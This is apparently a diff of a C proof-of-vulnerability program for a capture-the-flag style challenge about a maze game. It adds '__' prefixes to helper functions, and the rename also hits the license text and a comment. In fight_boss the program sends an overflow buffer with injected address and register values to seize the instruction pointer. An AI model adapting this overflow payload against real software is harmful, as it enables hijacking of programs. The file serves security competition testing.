@@ -4,7 +4,7 @@ Author: John Berry <hj@cromulence.com>
 
 Copyright (c) 2015 Cromulence LLC
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
+Permission is hereby granted, __free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
 in the Software without restriction, including without limitation the rights
 to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
@@ -93,7 +93,7 @@ size_t monster_exp;
 #define         FF      0x0c
 #define         CR      0x0d
 
-int isspace( int c )
+int __isspace( int c )
 {
         if ( c == SPC ||
              c == TAB ||
@@ -106,7 +106,7 @@ int isspace( int c )
                 return 0;
 }
 
-int isdigit( int c )
+int __isdigit( int c )
 {
         if ( c >= '0' && c <= '9' )
                 return 1;
@@ -114,12 +114,12 @@ int isdigit( int c )
                 return 0;
 }
 
-int atoi( const char *pStr )
+int __atoi( const char *pStr )
 {
         int value = 0;
         int negative = 0;
 
-        while ( isspace( *pStr ) )
+        while ( __isspace( *pStr ) )
                 pStr++;
 
         if ( *pStr == '\0' )
@@ -132,7 +132,7 @@ int atoi( const char *pStr )
         }
 
         // Read in string
-        while ( isdigit( *pStr ) )
+        while ( __isdigit( *pStr ) )
                 value = (value * 10) + (*pStr++ - '0');
 
         if ( negative )
@@ -141,7 +141,7 @@ int atoi( const char *pStr )
                 return value;
 }
 
-size_t itoa( int value, char *out )
+size_t __itoa( int value, char *out )
 {
 	size_t index = 0;
 
@@ -158,7 +158,7 @@ size_t itoa( int value, char *out )
 	return index;
 }
 
-size_t strlen( const char *str )
+size_t __strlen( const char *str )
 {
         size_t len = 0;
         while ( *str++ != '\0' )
@@ -167,7 +167,7 @@ size_t strlen( const char *str )
         return len;
 }
 
-void bzero( char *buffer, size_t length)
+void __bzero( char *buffer, size_t length)
 {
 	size_t index = 0;
 
@@ -182,7 +182,7 @@ void bzero( char *buffer, size_t length)
 	return;
 }
 
-void memcpy( char *dst, char*src, size_t length)
+void __memcpy( char *dst, char*src, size_t length)
 {
 	size_t index = 0;
 
@@ -198,14 +198,14 @@ void memcpy( char *dst, char*src, size_t length)
 	return;
 }
 
-char *strcat(char *restrict s1, const char *restrict s2) {
+char *__strcat(char *restrict s1, const char *restrict s2) {
         unsigned int i,j;
 
         if (!s1 || !s2) {
                 return(NULL);
         }
 
-        for (i = strlen(s1), j = 0; j < strlen(s2); i++, j++) {
+        for (i = __strlen(s1), j = 0; j < __strlen(s2); i++, j++) {
                 s1[i] = s2[j];
         }
         s1[i] = '\0';
@@ -331,19 +331,19 @@ int addqueue( int x, int y, pmap m, char *dirs )
 
 	m->matrix[index] = 1;
 
-	pq = malloc( sizeof(queue));
+	pq = __malloc( sizeof(queue));
 
 	if ( pq == NULL ) {
 		_terminate(-1);
 	}
 
-	bzero((char*)pq, sizeof(queue));
+	__bzero((char*)pq, sizeof(queue));
 
 	pq->x = x;
 	pq->y = y;
-	pq->index = strlen(dirs);
+	pq->index = __strlen(dirs);
 
-	memcpy( pq->directions, dirs, pq->index);
+	__memcpy( pq->directions, dirs, pq->index);
 
 	/// Base case
 	if (m->root == NULL ) {
@@ -388,7 +388,7 @@ int findpath( pmap m )
 
 	while ( pq ) {
 		if ( pq->x == m->end_x && pq->y == m->end_y) {
-			memcpy( m->directions, pq->directions, strlen( pq->directions) );
+			__memcpy( m->directions, pq->directions, __strlen( pq->directions) );
 			return 1;
 		}
 
@@ -402,7 +402,7 @@ int findpath( pmap m )
 		pq->directions[pq->index] = 'l';
 		addqueue( pq->x-1, pq->y, m, pq->directions);
 
-		free(pq);
+		__free(pq);
 
 		pq = dequeue( m );
 
@@ -419,7 +419,7 @@ int fight_monster( )
 	int index;
 	int yodog = 0;
 
-	/// read the 26 lines
+	/// __read the 26 lines
 	for ( index = 0; index < 26; index++) {
 		ReadUntil( STDIN, '\n', (char*)buffer, 1024);
 	}
@@ -514,12 +514,12 @@ void fight_boss( unsigned int type1_reg, unsigned int type1_ip )
 			SendBytes(STDOUT, "y\n", 2);
 			ReadBytes( STDIN, (char*)buffer, 10);
 
-			memcpy( buffer, "aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrr\n", 73);
+			__memcpy( buffer, "aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrr\n", 73);
 
 			addr = 0xbaaa0000;
-			memcpy( buffer+32, (char*)&addr, 4 );
-			memcpy( buffer+36, (char*)&type1_reg, 4);
-			memcpy( buffer+44, (char*)&type1_ip, 4);
+			__memcpy( buffer+32, (char*)&addr, 4 );
+			__memcpy( buffer+36, (char*)&type1_reg, 4);
+			__memcpy( buffer+44, (char*)&type1_ip, 4);
 
 			/// Send bug
 			SendBytes(STDOUT, buffer, 73);
@@ -541,48 +541,48 @@ void getvalues( pmap pm )
 	char buffer[1024];
 	size_t length = 0;
 
-	bzero((char*)buffer, 1024);
+	__bzero((char*)buffer, 1024);
 
 	/// Read width and height
 	ReadBytes(STDIN, (char*)buffer, 7);
 
-	bzero( (char*)buffer, 1024);
+	__bzero( (char*)buffer, 1024);
 	ReadUntil( STDIN, ' ', (char*)buffer, 1024);
-	pm->width = atoi( (const char *)buffer );
+	pm->width = __atoi( (const char *)buffer );
 
 	ReadBytes(STDIN, (char*)buffer, 8);
 
-	bzero( (char*)buffer, 1024);
+	__bzero( (char*)buffer, 1024);
 	ReadUntil( STDIN, '\n', (char*)buffer, 1024);
-	pm->height = atoi( (const char *)buffer );
+	pm->height = __atoi( (const char *)buffer );
 
 	/// Read startx
 	ReadBytes(STDIN, (char*)buffer, 8);
 
-	bzero( (char*)buffer, 1024);
+	__bzero( (char*)buffer, 1024);
 	ReadUntil( STDIN, ' ', (char*)buffer, 1024);
-	pm->start_x = atoi( (const char *)buffer );
+	pm->start_x = __atoi( (const char *)buffer );
 
 	/// Read starty
 	ReadBytes(STDIN, (char*)buffer, 8);
 
-	bzero( (char*)buffer, 1024);
+	__bzero( (char*)buffer, 1024);
 	ReadUntil( STDIN, '\n', (char*)buffer, 1024);
-	pm->start_y = atoi( (const char *)buffer );
+	pm->start_y = __atoi( (const char *)buffer );
 
 	/// Read endx
 	ReadBytes(STDIN, (char*)buffer, 6);
 
-	bzero( (char*)buffer, 1024);
+	__bzero( (char*)buffer, 1024);
 	ReadUntil( STDIN, ' ', (char*)buffer, 1024);
-	pm->end_x = atoi( (const char *)buffer );
+	pm->end_x = __atoi( (const char *)buffer );
 
 	/// Read endy
 	ReadBytes(STDIN, (char*)buffer, 6);
 
-	bzero( (char*)buffer, 1024);
+	__bzero( (char*)buffer, 1024);
 	ReadUntil( STDIN, '\n', (char*)buffer, 1024);
-	pm->end_y = atoi( (const char *)buffer );
+	pm->end_y = __atoi( (const char *)buffer );
 
 	/// Read blank line
 	ReadBytes( STDIN, (char*)buffer, 1);
@@ -590,11 +590,11 @@ void getvalues( pmap pm )
 
 	length = pm->width * pm->height;
 
-	pm->map_data = malloc( length );
-	pm->matrix = malloc( length );
+	pm->map_data = __malloc( length );
+	pm->matrix = __malloc( length );
 
-	bzero( (char*)pm->map_data, length );
-	bzero( (char*)pm->matrix, length);
+	__bzero( (char*)pm->map_data, length );
+	__bzero( (char*)pm->matrix, length);
 
 	return;
 }
@@ -604,21 +604,21 @@ void setname( void )
 	char buffer[1024];
 	size_t index = 0;
 
-	bzero( (char*)buffer, 1024);
+	__bzero( (char*)buffer, 1024);
 
 	while ( buffer[0] != '|' ) {
 		ReadBytes(STDIN, (char*)buffer, 1);
 	}
 
-	ReadBytes( STDIN, (char*)buffer + strlen((char*)buffer), 2 );
+	ReadBytes( STDIN, (char*)buffer + __strlen((char*)buffer), 2 );
 
-	bzero( (char*)buffer, 1024);
+	__bzero( (char*)buffer, 1024);
 	buffer[0] = '\n', 
 	SendBytes(STDOUT, (char*)buffer, 1);
 
 	//player Data
 	for ( index = 0; index < 15; index++) {
-		bzero( (char*)buffer, 1024);
+		__bzero( (char*)buffer, 1024);
 
 		ReadUntil( STDIN, '\n', (char*)buffer, 1024);
 	}
@@ -630,11 +630,11 @@ void sendegg( void )
 {
 	char buffer[1024];
 
-	bzero( (char*)buffer, 1024);
+	__bzero( (char*)buffer, 1024);
 
 	ReadBytes(STDIN, (char*)buffer, 3);
 
-	bzero( (char*)buffer, 1024);
+	__bzero( (char*)buffer, 1024);
 	buffer[0] = 'e';
 	buffer[1] = '\n';
 
@@ -726,7 +726,7 @@ int main(void) {
 	map m;
 	monster_exp = 0;
 
-	bzero( (char*)&m, sizeof(map));
+	__bzero( (char*)&m, sizeof(map));
 
 	// negotiate a Type1 POV with the Competition Framework
 	// we will control eip and ebp
@@ -735,9 +735,9 @@ int main(void) {
 	type1_ip |= 0x01010101;
 	type1_reg |= 0x01010101;
 	
-	inout = malloc( 1024);
+	inout = __malloc( 1024);
 
-	bzero(inout, 1024);
+	__bzero(inout, 1024);
 
 	setname();
 
@@ -752,8 +752,8 @@ int main(void) {
 	/// Loop through all the directions
 	index = 0;
 
-	while ( index < strlen(m.directions) ) {
-		bzero((char*)inout, 1024);
+	while ( index < __strlen(m.directions) ) {
+		__bzero((char*)inout, 1024);
 		ReadBytes( STDIN, (char*)inout, 2);
 
 		switch (inout[0]) {
@@ -795,7 +795,7 @@ int main(void) {
 	
 
 	/// This should be the boss
-	bzero((char*)inout, 1024);
+	__bzero((char*)inout, 1024);
 	ReadUntil( STDIN, '\n', (char*)inout, 1024);
 	
 	if ( inout[0] != 'r' && inout[1] != 'e') {
